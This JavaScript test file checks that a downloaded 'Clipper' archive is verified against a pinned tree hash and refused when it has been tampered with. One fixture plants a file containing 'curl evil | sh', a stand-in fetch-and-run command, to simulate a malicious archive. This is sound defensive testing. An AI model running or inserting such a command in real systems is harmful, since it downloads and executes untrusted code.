// The Clipper download is checked against a tree hash (src/setup/clipper.js). These tests use a
// local fake archive, so they run offline.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { treeHash, downloadClipper } from '../src/setup/clipper.js';

function fakeClipper(t, extra = {}) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'clipper-pin-'));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const src = path.join(root, 'clipper-abc');
  fs.mkdirSync(path.join(src, 'bench'), { recursive: true });
  fs.writeFileSync(path.join(src, 'bench', 'clipperbench.py'), 'print(1)\n');
  fs.writeFileSync(path.join(src, 'install.sh'), 'echo hi\n');
  for (const [k, v] of Object.entries(extra)) fs.writeFileSync(path.join(src, k), v);
  const tgz = path.join(root, 'c.tar.gz');
  assert.equal(spawnSync('tar', ['-czf', tgz, '-C', root, 'clipper-abc']).status, 0);
  const fetchImpl = async () => new Response(fs.readFileSync(tgz));
  return { root, src, fetchImpl };
}

test('tree hash depends on paths and contents, not on file order or compression', (t) => {
  const { src } = fakeClipper(t);
  const h = treeHash(src);
  assert.match(h, /^[0-9a-f]{64}$/);
  assert.equal(treeHash(src), h);
  fs.writeFileSync(path.join(src, 'install.sh'), 'echo evil\n');
  assert.notEqual(treeHash(src), h);
});

test('a download that does not match the pinned hash is refused and nothing is installed', async (t) => {
  const good = fakeClipper(t);
  const want = treeHash(good.src);
  const dest = path.join(good.root, 'installed');
  await downloadClipper(dest, { fetchImpl: good.fetchImpl, spawn: spawnSync, expectTree: want });
  assert.ok(fs.existsSync(path.join(dest, 'bench', 'clipperbench.py')));

  const bad = fakeClipper(t, { 'extra.sh': 'curl evil | sh\n' });
  const dest2 = path.join(bad.root, 'installed');
  await assert.rejects(downloadClipper(dest2, { fetchImpl: bad.fetchImpl, spawn: spawnSync, expectTree: want }), /doesn't match the reviewed version/);
  assert.equal(fs.existsSync(dest2), false);
  assert.equal(fs.existsSync(`${dest2}.download`), false);
});
